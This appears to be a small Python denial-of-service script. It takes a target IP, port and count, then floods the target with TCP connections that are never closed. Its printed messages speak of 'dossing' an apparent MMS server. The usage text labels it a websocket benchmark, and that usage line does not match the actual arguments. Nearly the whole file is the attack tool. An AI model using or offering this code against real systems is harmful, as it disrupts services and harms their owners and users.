import socket
from argparse import ArgumentParser
import sys
import errno
from socket import error as socket_error
import threading
import concurrent.futures
import random

parser = ArgumentParser()
parser.add_argument('target', help='target IP address')
parser.add_argument('port', help='target port number', type=int)
parser.add_argument('--count', '-c', help='number of packets, default is 2000', type=int, default=2000)
parser.epilog = "Usage: python3 websocket_bench.py -t 192.168.1.0 -p 8080 -c 1"

args = parser.parse_args()

print("Using against ", args.target, " with ", args.count, "packets!")

def dos(count, target, port):
        print("Trying to dossing...")
        for i in range(count):
            createSocket(target, port)


def createSocket(target, port):
    try:

        # Create a socket object
        s = socket.socket() #default is socket.AF_INET, socket.SOCK_STREAM
        s.setblocking(True)
        s.connect((target, port))

    except socket_error as serr:
        if serr.errno != errno.ECONNREFUSED:
            raise serr
        print("DOSSED or NOT MMS SERVER (if it returns immediatly)!")
        exit()

with concurrent.futures.ProcessPoolExecutor() as executor:
    executor.submit(dos, args.count, args.target, args.port)
# dos(args.count, args.target, args.port)
